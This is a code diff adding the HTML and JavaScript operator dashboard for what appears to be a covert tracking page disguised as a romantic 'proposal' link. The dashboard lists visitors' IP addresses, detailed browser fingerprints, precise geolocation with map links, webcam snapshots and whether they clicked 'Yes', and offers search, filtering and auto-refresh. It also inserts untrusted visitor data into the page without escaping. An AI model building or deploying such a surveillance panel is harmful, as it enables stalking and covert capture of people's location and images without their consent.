@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel — Data Collected</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    background: #0a0c10;
+    color: #e1e4e8;
+    padding: 24px;
+    min-height: 100vh;
+  }
+
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 28px;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+
+  .header h1 {
+    font-size: 1.6rem;
+    font-weight: 700;
+    color: #f0f2f5;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .header h1 .badge {
+    background: #ff416c;
+    color: #fff;
+    font-size: 0.75rem;
+    font-weight: 600;
+    padding: 4px 12px;
+    border-radius: 20px;
+    letter-spacing: 0.3px;
+  }
+
+  .header-actions {
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  .stats-bar {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 24px;
+    flex-wrap: wrap;
+  }
+
+  .stat-card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    padding: 16px 24px;
+    flex: 1;
+    min-width: 140px;
+  }
+
+  .stat-card .value {
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: #f0f2f5;
+  }
+
+  .stat-card .label {
+    font-size: 0.8rem;
+    color: #8b949e;
+    margin-top: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .stat-card.accent { border-color: #ff416c; }
+  .stat-card.accent .value { color: #ff416c; }
+
+  .controls {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+
+  .controls input, .controls select {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 10px 16px;
+    color: #e1e4e8;
+    font-size: 0.9rem;
+    font-family: inherit;
+  }
+
+  .controls input { flex: 1; min-width: 200px; }
+  .controls input::placeholder { color: #6e7681; }
+  .controls select { cursor: pointer; }
+
+  .btn {
+    padding: 10px 20px;
+    border: none;
+    border-radius: 8px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: inherit;
+  }
+
+  .btn-primary { background: #ff416c; color: #fff; }
+  .btn-primary:hover { background: #e6355a; transform: translateY(-1px); }
+
+  .btn-danger { background: #21262d; color: #f85149; border: 1px solid #f8514933; }
+  .btn-danger:hover { background: #f851491a; }
+
+  .btn-secondary { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
+  .btn-secondary:hover { background: #30363d; }
+
+  .btn-sm { padding: 6px 14px; font-size: 0.8rem; }
+
+  .table-container {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 24px;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  thead th {
+    text-align: left;
+    padding: 12px 16px;
+    font-size: 0.75rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: #8b949e;
+    background: #0d1117;
+    border-bottom: 1px solid #30363d;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  thead th:hover { color: #e1e4e8; }
+
+  tbody tr {
+    border-bottom: 1px solid #21262d;
+    transition: background 0.15s;
+    cursor: pointer;
+  }
+
+  tbody tr:hover { background: #1c2128; }
+  tbody tr:last-child { border-bottom: none; }
+
+  tbody td {
+    padding: 12px 16px;
+    font-size: 0.85rem;
+    color: #c9d1d9;
+    vertical-align: middle;
+  }
+
+  .col-id { font-family: monospace; font-size: 0.75rem; color: #8b949e; }
+  .col-ip { font-family: monospace; color: #58a6ff; }
+  .col-device { color: #e1e4e8; }
+  .col-time { color: #8b949e; font-size: 0.8rem; white-space: nowrap; }
+  .col-geo { text-align: center; }
+  .col-webcam { text-align: center; }
+  .col-actions { text-align: right; }
+
+  .tag {
+    display: inline-block;
+    padding: 2px 10px;
+    border-radius: 12px;
+    font-size: 0.7rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.3px;
+  }
+  .tag-yes { background: #3fb95033; color: #3fb950; }
+  .tag-geo { background: #58a6ff33; color: #58a6ff; }
+  .tag-cam { background: #d2992233; color: #d29922; }
+  .tag-new { background: #ff416c33; color: #ff416c; }
+
+  .indicator {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 28px; height: 28px;
+    border-radius: 50%;
+    font-size: 0.8rem;
+  }
+  .indicator-yes { background: #3fb95033; color: #3fb950; }
+  .indicator-no { background: #21262d; color: #30363d; }
+
+  /* Detail modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(4px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .modal-overlay.active { display: flex; }
+
+  .modal {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 16px;
+    max-width: 800px;
+    width: 100%;
+    max-height: 85vh;
+    overflow-y: auto;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+    animation: modalIn 0.25s ease;
+  }
+
+  @keyframes modalIn { from { opacity: 0; transform: scale(0.95) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+
+  .modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 24px;
+    border-bottom: 1px solid #30363d;
+    position: sticky;
+    top: 0;
+    background: #161b22;
+    z-index: 1;
+  }
+
+  .modal-header h2 { font-size: 1.2rem; color: #f0f2f5; }
+
+  .modal-close {
+    background: none;
+    border: none;
+    color: #8b949e;
+    font-size: 1.5rem;
+    cursor: pointer;
+    padding: 4px 8px;
+    border-radius: 6px;
+    line-height: 1;
+  }
+  .modal-close:hover { background: #21262d; color: #e1e4e8; }
+
+  .modal-body { padding: 24px; }
+
+  .detail-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+
+  @media (max-width: 600px) { .detail-grid { grid-template-columns: 1fr; } }
+
+  .detail-field {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 12px 16px;
+  }
+
+  .detail-field.full { grid-column: 1 / -1; }
+
+  .detail-field label {
+    display: block;
+    font-size: 0.7rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    color: #8b949e;
+    margin-bottom: 6px;
+  }
+
+  .detail-field .value {
+    font-size: 0.9rem;
+    color: #e1e4e8;
+    word-break: break-word;
+    font-family: monospace;
+  }
+
+  .detail-field .value.json { white-space: pre-wrap; font-size: 0.75rem; max-height: 200px; overflow-y: auto; }
+
+  .webcam-preview {
+    max-width: 100%;
+    border-radius: 8px;
+    border: 1px solid #30363d;
+    margin-top: 8px;
+  }
+
+  .map-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    color: #58a6ff;
+    text-decoration: none;
+    font-size: 0.85rem;
+    margin-top: 4px;
+  }
+  .map-link:hover { text-decoration: underline; }
+
+  .empty-state {
+    text-align: center;
+    padding: 60px 20px;
+    color: #8b949e;
+  }
+
+  .empty-state .icon { font-size: 3rem; margin-bottom: 16px; }
+  .empty-state h3 { font-size: 1.2rem; color: #c9d1d9; margin-bottom: 8px; }
+  .empty-state p { font-size: 0.9rem; }
+
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    background: #21262d;
+    color: #e1e4e8;
+    padding: 12px 24px;
+    border-radius: 10px;
+    border: 1px solid #30363d;
+    font-size: 0.85rem;
+    font-weight: 500;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.4);
+    transform: translateY(20px);
+    opacity: 0;
+    transition: all 0.3s ease;
+    pointer-events: none;
+    z-index: 2000;
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+
+  .live-indicator {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 0.75rem;
+    color: #3fb950;
+  }
+  .live-dot {
+    width: 8px; height: 8px;
+    background: #3fb950;
+    border-radius: 50%;
+    animation: livePulse 1.5s ease-in-out infinite;
+  }
+  @keyframes livePulse {
+    0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(63,185,80,0.4); }
+    50% { opacity: 0.6; box-shadow: 0 0 0 6px rgba(63,185,80,0); }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 8px; }
+  ::-webkit-scrollbar-track { background: #0d1117; }
+  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: #484f58; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>
+    🕵️ Admin Panel
+    <span class="badge">PENTEST</span>
+    <span class="live-indicator"><span class="live-dot"></span> LIVE</span>
+  </h1>
+  <div class="header-actions">
+    <button class="btn btn-secondary" onclick="refreshData()">🔄 Refresh</button>
+    <button class="btn btn-danger" onclick="clearAllData()">🗑️ Clear All</button>
+    <button class="btn btn-primary" onclick="autoRefresh=!autoRefresh; this.textContent=autoRefresh?'⏹️ Stop Auto':'▶️ Auto Refresh'" id="autoBtn">▶️ Auto Refresh</button>
+  </div>
+</div>
+
+<div class="stats-bar" id="statsBar">
+  <div class="stat-card accent">
+    <div class="value" id="statTotal">0</div>
+    <div class="label">Total Visitors</div>
+  </div>
+  <div class="stat-card">
+    <div class="value" id="statGeo">0</div>
+    <div class="label">📍 Geolocated</div>
+  </div>
+  <div class="stat-card">
+    <div class="value" id="statCam">0</div>
+    <div class="label">📷 Webcam Captures</div>
+  </div>
+  <div class="stat-card">
+    <div class="value" id="statYes">0</div>
+    <div class="label">💍 Said Yes</div>
+  </div>
+  <div class="stat-card">
+    <div class="value" id="statToday">0</div>
+    <div class="label">Today</div>
+  </div>
+</div>
+
+<div class="controls">
+  <input type="text" id="searchInput" placeholder="🔍 Search by IP, device, browser, OS..." oninput="renderTable()">
+  <select id="filterYes" onchange="renderTable()">
+    <option value="all">All Visitors</option>
+    <option value="yes">Said Yes 💖</option>
+    <option value="no">Didn't Click</option>
+  </select>
+  <select id="filterCapture" onchange="renderTable()">
+    <option value="all">All Data</option>
+    <option value="geo">Has Geolocation</option>
+    <option value="cam">Has Webcam</option>
+    <option value="both">Geo + Webcam</option>
+  </select>
+  <span style="color:#8b949e;font-size:0.85rem;margin-left:auto;" id="resultCount"></span>
+</div>
+
+<div class="table-container">
+  <table>
+    <thead>
+      <tr>
+        <th onclick="sortBy('id')" style="width:60px">ID ▾</th>
+        <th onclick="sortBy('ip')">IP Address</th>
+        <th onclick="sortBy('device')">Device / Browser</th>
+        <th onclick="sortBy('timestamp')" style="width:160px">Timestamp</th>
+        <th style="width:40px" title="Said Yes">💍</th>
+        <th style="width:40px" title="Has Geolocation">📍</th>
+        <th style="width:40px" title="Has Webcam">📷</th>
+        <th style="width:80px">Actions</th>
+      </tr>
+    </thead>
+    <tbody id="tableBody">
+    </tbody>
+  </table>
+</div>
+
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <div class="modal-header">
+      <h2>🔍 Visitor Details</h2>
+      <button class="modal-close" onclick="closeModal()">&times;</button>
+    </div>
+    <div class="modal-body" id="modalBody">
+      <!-- populated dynamically -->
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+let allData = [];
+let autoRefresh = false;
+let sortKey = 'timestamp';
+let sortDir = -1;
+let refreshInterval = null;
+
+// ---- Fetch ----
+async function fetchData() {
+  try {
+    const res = await fetch('/api/data');
+    allData = await res.json();
+    updateStats();
+    renderTable();
+  } catch(e) {
+    showToast('Failed to fetch data');
+  }
+}
+
+// ---- Stats ----
+function updateStats() {
+  document.getElementById('statTotal').textContent = allData.length;
+  const geo = allData.filter(d => d.geolocation).length;
+  const cam = allData.filter(d => d.webcam_image).length;
+  const yes = allData.filter(d => d.type === 'click' && d.buttonText && d.buttonText.includes('Yes')).length;
+  const today = allData.filter(d => new Date(d.timestamp).toDateString() === new Date().toDateString()).length;
+  document.getElementById('statGeo').textContent = geo;
+  document.getElementById('statCam').textContent = cam;
+  document.getElementById('statYes').textContent = yes;
+  document.getElementById('statToday').textContent = today;
+}
+
+// ---- Render ----
+function renderTable() {
+  const search = document.getElementById('searchInput').value.toLowerCase();
+  const filterYes = document.getElementById('filterYes').value;
+  const filterCapture = document.getElementById('filterCapture').value;
+
+  // Collect all unique visitor entries (page_visit)
+  // But also collect click events and link them
+  const visitors = {};
+  allData.forEach(d => {
+    if (d.type === 'page_visit') {
+      if (!visitors[d.id]) visitors[d.id] = d;
+    }
+  });
+
+  // Merge click data into visitor records
+  allData.forEach(d => {
+    if (d.type === 'click') {
+      if (visitors[d.id]) {
+        if (!visitors[d.id]._clicks) visitors[d.id]._clicks = [];
+        visitors[d.id]._clicks.push(d);
+      }
+    }
+  });
+
+  let entries = Object.values(visitors);
+
+  // Search filter
+  if (search) {
+    entries = entries.filter(e => {
+      const fp = e.fingerprint || {};
+      const ua = (fp.userAgent || '').toLowerCase();
+      const ip = (e.ip || '').toLowerCase();
+      const plat = (fp.platform || '').toLowerCase();
+      const lang = (fp.language || '').toLowerCase();
+      const dev = (fp.deviceMemory || '');
+      return ua.includes(search) || ip.includes(search) || plat.includes(search) || lang.includes(search) || dev.includes(search);
+    });
+  }
+
+  // Yes filter
+  if (filterYes === 'yes') {
+    entries = entries.filter(e => (e._clicks && e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes'))));
+  } else if (filterYes === 'no') {
+    entries = entries.filter(e => !e._clicks || !e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes')));
+  }
+
+  // Capture filter
+  if (filterCapture === 'geo') entries = entries.filter(e => e.geolocation);
+  else if (filterCapture === 'cam') entries = entries.filter(e => e.webcam_image);
+  else if (filterCapture === 'both') entries = entries.filter(e => e.geolocation && e.webcam_image);
+
+  // Sort
+  entries.sort((a, b) => {
+    let va, vb;
+    if (sortKey === 'id') { va = a.id; vb = b.id; }
+    else if (sortKey === 'ip') { va = a.ip || ''; vb = b.ip || ''; }
+    else if (sortKey === 'device') {
+      va = (a.fingerprint?.userAgent || '').toLowerCase();
+      vb = (b.fingerprint?.userAgent || '').toLowerCase();
+    }
+    else { va = a.timestamp || ''; vb = b.timestamp || ''; }
+
+    if (va < vb) return -1 * sortDir;
+    if (va > vb) return 1 * sortDir;
+    return 0;
+  });
+
+  document.getElementById('resultCount').textContent = `${entries.length} result${entries.length !== 1 ? 's' : ''}`;
+
+  const tbody = document.getElementById('tableBody');
+  if (entries.length === 0) {
+    tbody.innerHTML = `<tr><td colspan="8"><div class="empty-state"><div class="icon">📭</div><h3>No data collected yet</h3><p>Share the proposal link and wait for visitors!</p></div></td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = entries.map(e => {
+    const fp = e.fingerprint || {};
+    const ua = fp.userAgent || '';
+    const device = ua.split(' ').slice(-2, -1)[0] || ua.slice(0, 40) || 'Unknown';
+    const os = ua.includes('Windows') ? '🪟' : ua.includes('Mac') ? '🍎' : ua.includes('Linux') ? '🐧' : ua.includes('Android') ? '📱' : ua.includes('iPhone') ? '📱' : '❓';
+    const browser = ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' : ua.includes('Edge') ? 'Edge' : 'Other';
+    const saidYes = e._clicks && e._clicks.some(c => c.buttonText && c.buttonText.includes('Yes'));
+    const hasGeo = !!e.geolocation;
+    const hasCam = !!e.webcam_image;
+
+    return `<tr onclick="viewDetail('${e.id}')">
+      <td class="col-id">${e.id.slice(-8)}</td>
+      <td class="col-ip">${e.ip || '—'}</td>
+      <td class="col-device">
+        <span style="margin-right:4px">${os}</span>
+        ${browser}
+        <span style="color:#8b949e;font-size:0.75rem;margin-left:4px">${fp.platform || ''}</span>
+      </td>
+      <td class="col-time">${new Date(e.timestamp).toLocaleString()}</td>
+      <td class="col-geo">${saidYes ? '<span class="indicator indicator-yes">💖</span>' : '<span class="indicator indicator-no">—</span>'}</td>
+      <td class="col-geo">${hasGeo ? '<span class="tag tag-geo">✓</span>' : '<span style="color:#30363d">—</span>'}</td>
+      <td class="col-webcam">${hasCam ? '<span class="tag tag-cam">✓</span>' : '<span style="color:#30363d">—</span>'}</td>
+      <td class="col-actions">
+        <button class="btn btn-sm btn-secondary" onclick="event.stopPropagation();viewDetail('${e.id}')">View</button>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+// ---- Sort ----
+function sortBy(key) {
+  if (sortKey === key) sortDir *= -1;
+  else { sortKey = key; sortDir = -1; }
+  renderTable();
+}
+
+// ---- View Detail ----
+function viewDetail(id) {
+  const data = allData.find(d => d.id === id && d.type === 'page_visit');
+  if (!data) return showToast('Record not found');
+
+  // Also find related clicks
+  const clicks = allData.filter(d => d.id === id && d.type === 'click');
+
+  const fp = data.fingerprint || {};
+  const modal = document.getElementById('modal');
+  const body = document.getElementById('modalBody');
+
+  const geoMap = data.geolocation
+    ? `<a class="map-link" href="https://www.google.com/maps?q=${data.geolocation.latitude},${data.geolocation.longitude}" target="_blank">🗺️ View on Google Maps (${data.geolocation.latitude.toFixed(4)}, ${data.geolocation.longitude.toFixed(4)})</a>`
+    : '<span style="color:#8b949e">Not captured</span>';
+
+  const webcam = data.webcam_image
+    ? `<img src="${data.webcam_image}" class="webcam-preview" alt="Webcam snapshot">`
+    : '<span style="color:#8b949e">Not captured</span>';
+
+  body.innerHTML = `
+    <div class="detail-grid">
+      <div class="detail-field">
+        <label>Visitor ID</label>
+        <div class="value">${data.id}</div>
+      </div>
+      <div class="detail-field">
+        <label>IP Address</label>
+        <div class="value" style="color:#58a6ff">${data.ip || 'Unknown'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Timestamp</label>
+        <div class="value">${new Date(data.timestamp).toLocaleString()}</div>
+      </div>
+      <div class="detail-field">
+        <label>Source</label>
+        <div class="value">${data.source || 'direct'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Referrer</label>
+        <div class="value">${data.referrer || '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Page Load Time</label>
+        <div class="value">${Math.round(data.pageLoaded)}ms</div>
+      </div>
+      <div class="detail-field">
+        <label>Browser</label>
+        <div class="value" style="font-size:0.8rem">${fp.userAgent || '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Platform</label>
+        <div class="value">${fp.platform || '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Language</label>
+        <div class="value">${fp.language || '—'} ${fp.languages ? '(' + fp.languages.join(', ') + ')' : ''}</div>
+      </div>
+      <div class="detail-field">
+        <label>Timezone</label>
+        <div class="value">${fp.timezone || '—'} (UTC${fp.timezoneOffset ? (fp.timezoneOffset > 0 ? '-' : '+') + Math.abs(fp.timezoneOffset/60) : '?'})</div>
+      </div>
+      <div class="detail-field">
+        <label>Screen</label>
+        <div class="value">${fp.screen ? fp.screen.width + 'x' + fp.screen.height + ' @ ' + fp.screen.colorDepth + 'bit' : '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Window Size</label>
+        <div class="value">${fp.window ? fp.window.innerWidth + 'x' + fp.window.innerHeight + ' (dpr: ' + fp.window.devicePixelRatio + ')' : '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Hardware</label>
+        <div class="value">CPU Cores: ${fp.hardwareConcurrency || '?'} | RAM: ${fp.deviceMemory || '?'}GB | Touch: ${fp.maxTouchPoints || 0}pts</div>
+      </div>
+      <div class="detail-field">
+        <label>Connection</label>
+        <div class="value">${fp.connection ? fp.connection.effectiveType + ' (' + fp.connection.downlink + 'Mbps, RTT ' + fp.connection.rtt + 'ms)' : '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Battery</label>
+        <div class="value">${fp.battery ? (fp.battery.charging ? '🔌 ' : '🔋 ') + Math.round(fp.battery.level * 100) + '%' : '—'}</div>
+      </div>
+      <div class="detail-field">
+        <label>AdBlock / Canvas FP</label>
+        <div class="value">AdBlock: ${fp.adblock ? '⚠️ Enabled' : 'Not detected'} | Cookie: ${fp.cookieEnabled ? 'Yes' : 'No'} | DNT: ${fp.doNotTrack || 'Not set'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Plugins (${(fp.plugins || []).length})</label>
+        <div class="value" style="font-size:0.75rem">${(fp.plugins || []).join(', ') || 'None'}</div>
+      </div>
+      <div class="detail-field">
+        <label>Fonts Found (${(fp.fonts || []).length})</label>
+        <div class="value" style="font-size:0.75rem">${(fp.fonts || []).join(', ') || 'None'}</div>
+      </div>
+      ${clicks.length > 0 ? `
+      <div class="detail-field full">
+        <label>Clicks (${clicks.length})</label>
+        <div class="value" style="font-size:0.8rem">${clicks.map(c => '• "' + c.buttonText + '" — ' + new Date(c.timestamp).toLocaleTimeString()).join('<br>')}</div>
+      </div>` : ''}
+      <div class="detail-field full">
+        <label>📍 Geolocation</label>
+        <div>${geoMap}</div>
+      </div>
+      <div class="detail-field full">
+        <label>📷 Webcam Snapshot</label>
+        <div>${webcam}</div>
+      </div>
+      <div class="detail-field full">
+        <label>🖼️ Canvas Fingerprint</label>
+        <div class="value json">${fp.canvasFingerprint ? '<img src="' + fp.canvasFingerprint + '" style="border:1px solid #30363d;border-radius:4px;max-width:200px">' : '—'}</div>
+      </div>
+      <div class="detail-field full">
+        <label>Raw JSON</label>
+        <div class="value json">${JSON.stringify(data, null, 2)}</div>
+      </div>
+    </div>
+  `;
+
+  modal.classList.add('active');
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('active');
+}
+
+// Close modal on overlay click
+document.getElementById('modal').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+
+// ESC to close
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeModal();
+});
+
+// ---- Clear All ----
+async function clearAllData() {
+  if (!confirm('Clear ALL collected data? This cannot be undone.')) return;
+  try {
+    await fetch('/api/data', { method: 'DELETE' });
+    allData = [];
+    updateStats();
+    renderTable();
+    showToast('All data cleared');
+  } catch(e) {
+    showToast('Failed to clear data');
+  }
+}
+
+// ---- Refresh ----
+function refreshData() {
+  fetchData();
+  showToast('Data refreshed');
+}
+
+// Toggle auto refresh
+document.getElementById('autoBtn').addEventListener('click', function() {
+  autoRefresh = !autoRefresh;
+  this.textContent = autoRefresh ? '⏹️ Stop Auto' : '▶️ Auto Refresh';
+  if (autoRefresh) {
+    refreshInterval = setInterval(fetchData, 5000);
+  } else {
+    clearInterval(refreshInterval);
+  }
+});
+
+// ---- Toast ----
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._hide);
+  t._hide = setTimeout(() => t.classList.remove('show'), 2500);
+}
+
+// ---- Init ----
+fetchData();
+</script>
+</body>
+</html>
+
